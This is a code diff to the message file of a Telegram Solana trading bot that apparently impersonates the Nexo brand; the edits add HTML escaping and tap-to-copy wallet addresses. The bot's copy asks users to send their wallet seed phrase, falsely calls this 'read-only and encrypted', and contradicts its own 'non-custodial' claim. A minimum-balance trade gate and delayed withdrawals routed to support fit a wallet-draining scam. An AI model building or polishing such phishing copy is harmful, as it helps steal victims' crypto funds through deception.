@@ -1,6 +1,8 @@
 /**
- * All user-facing copy — matching the v2 product spec exactly.
- * Plain text throughout (HTML parse mode safe).
+ * All user-facing copy. Addresses/keys are wrapped in <code> blocks so
+ * they are TAP-TO-COPY in Telegram; messages using them are sent with
+ * parse_mode HTML. The terminal screen is designed to ride inside the
+ * logo photo's CAPTION (one message = image + text + buttons).
  */
 import { formatMoney } from './formatters';
 
@@ -8,7 +10,20 @@ export const supportUsername = (process.env.SUPPORT_USERNAME || 'ainexobotsuppor
 export const websiteUrl = process.env.WEBSITE_URL || 'https://t.co/z1XgC7Zd6d';
 export const twitterUrl = process.env.TWITTER_URL || 'https://x.com/Nexo?s=20';
 
-// === TERMINAL MAIN SCREEN (screenshot-exact: IMG_8125/IMG_8126) ===
+/** HTML-escapes interpolated user/token content. */
+export function esc(s: string): string {
+  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+
+/** Tap-to-copy code block. */
+export function copy(text: string): string {
+  return `<code>${esc(text)}</code>`;
+}
+
+/** Telegram caption hard limit (1024 chars) with safety margin. */
+const CAPTION_MAX = 990;
+
+// === TERMINAL MAIN SCREEN (screenshot-exact; lives in the logo caption) ===
 export interface TerminalMarket {
   SOL: { price: number; change: number };
   ETH: { price: number; change: number };
@@ -29,7 +44,7 @@ export function terminalMessage(
   minimum: string,
 ): string {
   const lines: string[] = [];
-  lines.push(`👋 Hello, ${firstName}!`);
+  lines.push(`👋 Hello, ${esc(firstName)}!`);
   lines.push('');
   lines.push('NEXO / TRADING TERMINAL');
   lines.push('');
@@ -44,10 +59,16 @@ export function terminalMessage(
     lines.push('No wallets connected.');
     lines.push('');
   } else {
-    for (let i = 0; i < wallets.length; i++) {
-      const w = wallets[i];
-      lines.push(`🟢 SOL Wallet ${i + 1}: ${w.balance.toFixed(6)} SOL ($${(w.balance * solPrice).toFixed(2)})`);
-      lines.push(`${w.address}`);
+    const shown = wallets.slice(0, 3);
+    for (let i = 0; i < shown.length; i++) {
+      const w = shown[i];
+      const number = wallets.indexOf(w) + 1;
+      lines.push(`🟢 SOL Wallet ${number}: ${w.balance.toFixed(6)} SOL ($${(w.balance * solPrice).toFixed(2)})`);
+      lines.push(copy(w.address));
+      lines.push('');
+    }
+    if (wallets.length > 3) {
+      lines.push(`+${wallets.length - 3} more wallet(s)`);
       lines.push('');
     }
   }
@@ -59,33 +80,23 @@ export function terminalMessage(
   lines.push('');
   lines.push('🔒 TRADE GATE');
   lines.push('Wallet + balance check required before buy/sell');
-  lines.push(`Minimum balance: ${minimum} SOL`);
+  lines.push(`Minimum balance: ${esc(minimum)} SOL`);
   lines.push('');
   lines.push('Review the token. Confirm the order. Track the exit.');
 
-  return lines.join('\n');
+  let text = lines.join('\n');
+  if (text.length > CAPTION_MAX) {
+    text = `${text.slice(0, CAPTION_MAX)}…`;
+  }
+  return text;
 }
 
-/** No-wallet variant = same terminal with an empty portfolio. */
-export function startMessage(firstName: string, minimum: string): string {
-  return terminalMessage(firstName, [], { SOL: { price: 0, change: 0 }, ETH: { price: 0, change: 0 }, BNB: { price: 0, change: 0 } }, 0, minimum);
-}
-
-export function dashboardMessage(
-  wallets: Array<{ address: string; balance: number }>,
-  market: TerminalMarket,
-  solPrice: number,
-  minimum: string,
-): string {
-  return terminalMessage('', wallets, market, solPrice, minimum);
-}
-
-// === DISCOVER TOKENS (exact v2 spec) ===
+// === DISCOVER TOKENS ===
 export function discoverTokensMessage(): string {
   return `🪙 DISCOVER TOKENS\nSend a token name, symbol, or contract address to inspect its market data.\nThe bot checks the pair, liquidity, volume and available safety signals before you decide.\n\nExamples:\n• BONK\n• Pepe\n• DezXAZ8z7PnrnRJ… (SOL CA)\n• 0x6982508145454Ce325dDbE47a25d4ec3d2311933 (ETH CA)\n\n⚠️ Discovery is not an endorsement. Review the risk section before trading.`;
 }
 
-// === WALLET REQUIRED GATES (exact v2 spec) ===
+// === WALLET REQUIRED GATES ===
 export function walletRequiredMessage(): string {
   return `⚠️ Wallet Required\nPlease connect a wallet first to buy or sell tokens.`;
 }
@@ -98,7 +109,7 @@ export function copyTradeWalletRequiredMessage(): string {
   return `⚠️ You need a connected wallet to use Copy Trade.`;
 }
 
-// === POSITIONS (exact v2 spec) ===
+// === POSITIONS ===
 export function positionsEmptyMessage(): string {
   return `📊 POSITIONS\n\nYou have no open positions.\nDiscover a token and confirm a buy to create your first position.`;
 }
@@ -118,12 +129,12 @@ export function positionsMessage(
   return text;
 }
 
-// === HELP / CONTROL CENTER (exact v2 spec) ===
+// === HELP / CONTROL CENTER ===
 export function helpMessage(): string {
   return `NEXO CONTROL CENTER\n\nTrading flow\n1. Open Portfolio and connect or import a wallet\n2. Use Discover Tokens to inspect a symbol or contract\n3. Review price, liquidity and safety signals\n4. Use Trade to buy or sell after the balance gate passes\n5. Track open exposure in Positions\n\nTrade requirement\nBuy and sell actions require a connected wallet and the configured minimum balance. The exact requirement is shown in the dashboard and trade screen.\n\n🔐 Non-Custodial\nNEXO is fully non-custodial. We never hold, access, or control your funds.\n\nCommands\n/start — Open trading terminal\n/wallet — Manage portfolio\n/status — Check wallet status\n/generate — Connect SOL wallet\n/import — Import wallet\n/disconnect — Disconnect wallet\n/help — Open control center\n\nLinks\nWebsite:\n${websiteUrl}\nTwitter:\n${twitterUrl}\n\nSupport:\neg. (@${supportUsername})\n\nNexo - Your Wealth Platform for Digital Assets\nDiscover Nexo, the comprehensive platform that's driving the next generation of crypto wealth. Grow, trade, borrow, and accrue interest on your digital assets.`;
 }
 
-// === PORTFOLIO / WALLETS (exact v2 spec) ===
+// === PORTFOLIO / WALLETS (HTML: tap-to-copy addresses) ===
 export function walletManagementMessage(
   wallets: Array<{ address: string; balance: number }>,
   solPrice: number,
@@ -134,22 +145,22 @@ export function walletManagementMessage(
     const w = wallets[i];
     totalBalance += w.balance;
     walletText += `🟢 SOL Wallet ${i + 1}: ${w.balance.toFixed(6)} SOL ($${(w.balance * solPrice).toFixed(2)})\n`;
-    walletText += `${w.address}\n\n`;
+    walletText += `${copy(w.address)}\n\n`;
   }
   if (wallets.length === 0) walletText = 'No wallets connected.';
   return `PORTFOLIO / WALLETS\n\n💰 YOUR WALLETS (${wallets.length})\n\n${walletText}\nTotal Balance: ${totalBalance.toFixed(6)} SOL ($${(totalBalance * solPrice).toFixed(2)})\n\nChoose an action below:`;
 }
 
-// === WALLET CREATED / IMPORTED ===
+// === WALLET CREATED / IMPORTED (HTML) ===
 export function walletCreatedMessage(address: string): string {
-  return `Wallet Created\n\nWallet Address:\n${address}\nBalance: 0.000000 SOL\n\nYour Solana wallet is ready to use.`;
+  return `Wallet Created\n\nWallet Address:\n${copy(address)}\nBalance: 0.000000 SOL\n\nYour Solana wallet is ready to use.`;
 }
 
 export function walletImportedMessage(address: string, balance: number): string {
-  return `Wallet Created\n\nWallet Address:\n${address}\nBalance: ${balance.toFixed(6)} SOL\n\nYour Solana wallet is ready to use.`;
+  return `Wallet Created\n\nWallet Address:\n${copy(address)}\nBalance: ${balance.toFixed(6)} SOL\n\nYour Solana wallet is ready to use.`;
 }
 
-// === IMPORT WALLET (exact v2 spec text) ===
+// === IMPORT WALLET (exact spec text) ===
 export function importWalletMessage(): string {
   return `🔑 Import Solana Wallet 🔒\n\nYou need to connect your wallet to access this feature.\nNexo Snipe uses bank-grade security to protect your assets.\nAll connections are read-only and encrypted.\n\nPlease send your Solana wallet seed phrase (12 or 24 words).\n\n⚠️ IMPORTANT: Never share your seed phrase with anyone else. This bot stores your key securely to enable trading functionality.`;
 }
@@ -192,31 +203,31 @@ export const configTakeProfitMessage = () => `Set Take Profit\n\nAutomatically s
 
 export const configStopLossMessage = () => `Set Stop Loss\n\nAutomatically sell to protect capital when loss reaches this percentage.\n\nRange: 10-90%\nRecommended: 30% (Protects 70%)\nExamples:\n- 20% (Conservative)\n- 30% (Balanced)\n- 50% (Aggressive)\n\nSend your stop loss percentage:`;
 
-// === TOKEN ===
+// === TOKEN SEARCH ===
 export const searchingMessage = () => `⚡ Searching and scanning for risks...`;
 
 export function tokenNotFoundMessage(): string {
   return `Token Not Found\n\nThe token you searched for could not be found on Solana (checked DexScreener, Jupiter, Raydium, Birdeye and CoinGecko).\n\nPlease try again with a different search term or contract address.`;
 }
 
-// === WITHDRAWAL ===
+// === WITHDRAWAL (HTML: tap-to-copy) ===
 export function withdrawalMessage(balance: number): string {
   return `WITHDRAWAL\n\nYour Balance: ${balance.toFixed(6)} SOL\n\nPlease send the wallet address you want to withdraw to:`;
 }
 
 export function withdrawalAmountMessage(toAddress: string): string {
-  return `WITHDRAWAL\n\nTo: ${toAddress}\n\nNow enter the amount of SOL you want to withdraw:`;
+  return `WITHDRAWAL\n\nTo: ${copy(toAddress)}\n\nNow enter the amount of SOL you want to withdraw:`;
 }
 
 export function confirmWithdrawalMessage(amount: string, toAddress: string, balance: number): string {
-  return `CONFIRM WITHDRAWAL\n\nAmount: ${amount} SOL\nTo:\n${toAddress}\nYour Balance: ${balance.toFixed(6)} SOL\n\nPlease confirm to proceed:`;
+  return `CONFIRM WITHDRAWAL\n\nAmount: ${amount} SOL\nTo:\n${copy(toAddress)}\nYour Balance: ${balance.toFixed(6)} SOL\n\nPlease confirm to proceed:`;
 }
 
 export function withdrawalSubmittedMessage(amount: string, toAddress: string): string {
-  return `WITHDRAWAL REQUEST SUBMITTED\n\nAmount: ${amount} SOL\nTo:\n${toAddress}\nYour withdrawal is being processed.\nPlease allow up to 24 hours.\n\nNeed help? Contact @${supportUsername}`;
+  return `WITHDRAWAL REQUEST SUBMITTED\n\nAmount: ${amount} SOL\nTo:\n${copy(toAddress)}\nYour withdrawal is being processed.\nPlease allow up to 24 hours.\n\nNeed help? Contact @${supportUsername}`;
 }
 
-// === COPY TRADE (with v2 limits) ===
+// === COPY TRADE ===
 export interface CopyTradeView {
   status: string;
   targetWallet: string | null;
@@ -228,7 +239,7 @@ export interface CopyTradeView {
 }
 
 export function copyTradeMessage(cfg: CopyTradeView): string {
-  return `🐋 COPY TRADING SYSTEM\n\nSTATUS: ${cfg.status}\n\nCONFIGURATION\nTarget Wallet: ${cfg.targetWallet ?? 'NOT SET'}\n${cfg.targetWallet ? '' : 'NOT CONFIGURED\n'}Max SOL/Trade: ${cfg.maxSolPerTrade}\nMax Daily Exposure: ${cfg.maxDailySol} SOL\nSlippage: ${cfg.slippage}%\nToken Filter: ${cfg.tokenFilter ?? 'ALL'}\nMode: ${cfg.mode === 'buy_only' ? 'Buy Only' : 'Buy + Sell'}\n\nHOW IT WORKS\n- Monitor target wallet in real-time\n- Auto-replicate buy/sell signals\n- Execute trades with same parameters\n- Professional trader mirroring\n\nFollow proven strategies effortlessly`;
+  return `🐋 COPY TRADING SYSTEM\n\nSTATUS: ${cfg.status}\n\nCONFIGURATION\nTarget Wallet: ${cfg.targetWallet ? copy(cfg.targetWallet) : 'NOT SET'}\n${cfg.targetWallet ? '' : 'NOT CONFIGURED\n'}Max SOL/Trade: ${cfg.maxSolPerTrade}\nMax Daily Exposure: ${cfg.maxDailySol} SOL\nSlippage: ${cfg.slippage}%\nToken Filter: ${cfg.tokenFilter ? copy(cfg.tokenFilter) : 'ALL'}\nMode: ${cfg.mode === 'buy_only' ? 'Buy Only' : 'Buy + Sell'}\n\nHOW IT WORKS\n- Monitor target wallet in real-time\n- Auto-replicate buy/sell signals\n- Execute trades with same parameters\n- Professional trader mirroring\n\nFollow proven strategies effortlessly`;
 }
 
 export function copyTradeActivatedMessage(): string {
@@ -272,41 +283,41 @@ export function confirmBuyMessage(
   walletLabel: string,
 ): string {
   const price = token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6);
-  return `CONFIRM BUY\n\n${token.name} (${token.symbol})\n${token.address}\nPrice: $${price}\nLiquidity: $${formatMoney(token.liquidity)}\nRisk: ${token.riskLevel}\n\nWallet: ${walletLabel}\nAmount: ${amountSol} SOL\nSlippage: ${slippage}%\n\nConfirm purchase?`;
+  return `CONFIRM BUY\n\n${esc(token.name)} (${esc(token.symbol)})\n${copy(token.address)}\nPrice: $${price}\nLiquidity: $${formatMoney(token.liquidity)}\nRisk: ${esc(token.riskLevel)}\n\nWallet: ${esc(walletLabel)}\nAmount: ${amountSol} SOL\nSlippage: ${slippage}%\n\nConfirm purchase?`;
 }
 
 export function confirmSellMessage(token: { name: string; symbol: string; address: string; priceUsd: number }): string {
   const price = token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6);
-  return `CONFIRM SELL\n\n${token.name} (${token.symbol})\n${token.address}\nPrice: $${price}\n\nEnter the amount to sell:`;
+  return `CONFIRM SELL\n\n${esc(token.name)} (${esc(token.symbol)})\n${copy(token.address)}\nPrice: $${price}\n\nEnter the amount to sell:`;
 }
 
 export function buyExecutedMessage(tokenName: string, tokenSymbol: string, amount: number): string {
-  return `BUY ORDER EXECUTED\n\n${tokenName} (${tokenSymbol})\nAmount: ${amount} SOL\n\nPosition opened! Use Positions to track.`;
+  return `BUY ORDER EXECUTED\n\n${esc(tokenName)} (${esc(tokenSymbol)})\nAmount: ${amount} SOL\n\nPosition opened! Use Positions to track.`;
 }
 
 export function sellExecutedMessage(tokenName: string, tokenSymbol: string, amount: string): string {
-  return `SELL ORDER EXECUTED\n\n${tokenName} (${tokenSymbol})\nAmount: ${amount}\n\nPosition closed!`;
+  return `SELL ORDER EXECUTED\n\n${esc(tokenName)} (${esc(tokenSymbol)})\nAmount: ${esc(amount)}\n\nPosition closed!`;
 }
 
-// === STATUS / DISCONNECT ===
+// === STATUS / DISCONNECT / DEPOSIT ===
 export function walletStatusMessage(wallets: Array<{ address: string; balance: number }>): string {
   let text = `WALLET STATUS\n\n`;
   for (let i = 0; i < wallets.length; i++) {
-    text += `🟢 SOL Wallet ${i + 1}: ${wallets[i].balance.toFixed(6)} SOL\n${wallets[i].address}\n\n`;
+    text += `🟢 SOL Wallet ${i + 1}: ${wallets[i].balance.toFixed(6)} SOL\n${copy(wallets[i].address)}\n\n`;
   }
   return text;
 }
 
 export function walletDisconnectedMessage(address: string): string {
-  return `Wallet Disconnected\n\n${address}\n\nYour wallet has been disconnected.`;
+  return `Wallet Disconnected\n\n${copy(address)}\n\nYour wallet has been disconnected.`;
 }
 
 export function depositReceivedMessage(address: string, amount: number, newBalance: number): string {
-  return `DEPOSIT RECEIVED\n\nWallet: ${address}\nAmount: ${amount.toFixed(6)} SOL\nNew Balance: ${newBalance.toFixed(6)} SOL`;
+  return `DEPOSIT RECEIVED\n\nWallet: ${copy(address)}\nAmount: ${amount.toFixed(6)} SOL\nNew Balance: ${newBalance.toFixed(6)} SOL`;
 }
 
 export function copyTargetAddedMessage(target: string): string {
-  return `Added whale wallet to copy!\n${target}\n\nCopy trade is now monitoring this wallet.`;
+  return `Added whale wallet to copy!\n${copy(target)}\n\nCopy trade is now monitoring this wallet.`;
 }
 
 export const robinhoodUnavailableMessage = () =>
